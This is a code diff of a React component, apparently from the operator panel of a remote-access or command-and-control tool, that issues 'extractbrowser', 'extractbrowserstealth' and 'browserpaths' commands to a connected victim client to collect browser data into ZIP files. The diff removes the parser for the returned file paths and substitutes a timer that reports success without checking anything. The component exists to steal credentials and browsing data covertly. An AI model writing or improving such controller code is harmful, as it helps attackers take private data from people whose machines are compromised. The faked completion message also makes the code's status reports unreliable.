@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState } from 'react';
 import styled from 'styled-components';
 import { 
   FiShield, 
@@ -226,60 +226,28 @@ const ResultActions = styled.div`
 const BrowserExtractor = ({ client, socket }) => {
   const [extracting, setExtracting] = useState(false);
   const [results, setResults] = useState([]);
-  const expectingRef = useRef(null); // 'standard' | 'stealth' | 'paths' | null
-
-  useEffect(() => {
-    if (!socket) return;
-    const handleResponse = (data) => {
-      if (!client || data.clientId !== client.id) return;
-      const text = String(data.response || '');
-      if (expectingRef.current === 'paths' || /Recent Browser Data Extraction Paths:|ZIP FILE LOCATION|ZIP FILE LOCATIONS/i.test(text)) {
-        const parsed = parseExtractionOutput(text);
-        if (parsed.length > 0) setResults(parsed);
-        setExtracting(false);
-        expectingRef.current = null;
-      }
-      if (/Browser data extracted successfully|Stealth browser data extraction completed/i.test(text)) {
-        expectingRef.current = 'paths';
-        socket.emit('executeCommand', { clientId: client.id, command: 'browserpaths' });
-        setExtracting(false);
-      }
-    };
-    socket.on('commandResponse', handleResponse);
-    return () => socket.off('commandResponse', handleResponse);
-  }, [socket, client]);
-
-  const parseExtractionOutput = (text) => {
-    const out = [];
-    const zipRegex = /([A-Za-z]:\\[^\n\r]+\.zip|\/[^\n\r]+\.zip)/g;
-    let m;
-    while ((m = zipRegex.exec(text))) {
-      out.push({ name: 'Browser Data ZIP', path: m[1] });
-    }
-    const refRegex = /(~\w+?_paths_\d+\.txt|[A-Za-z]:\\[^\n\r]+_paths_\d+\.txt|\/[^\n\r]*_paths_\d+\.txt)/g;
-    while ((m = refRegex.exec(text))) {
-      out.push({ name: 'Path Reference', path: m[1] });
-    }
-    return out;
-  };
 
   const handleExtract = (type) => {
     if (!client || !socket) return;
 
     setExtracting(true);
     const command = type === 'stealth' ? 'extractbrowserstealth' : 'extractbrowser';
-    expectingRef.current = type === 'stealth' ? 'stealth' : 'standard';
     
     socket.emit('executeCommand', {
       clientId: client.id,
       command: command
     });
+
+    // Simulate extraction process
+    setTimeout(() => {
+      setExtracting(false);
+      toast.success(`Browser data extraction ${type} completed!`);
+    }, 3000);
   };
 
   const handleViewPaths = () => {
     if (!client || !socket) return;
 
-    expectingRef.current = 'paths';
     socket.emit('executeCommand', {
       clientId: client.id,
       command: 'browserpaths'
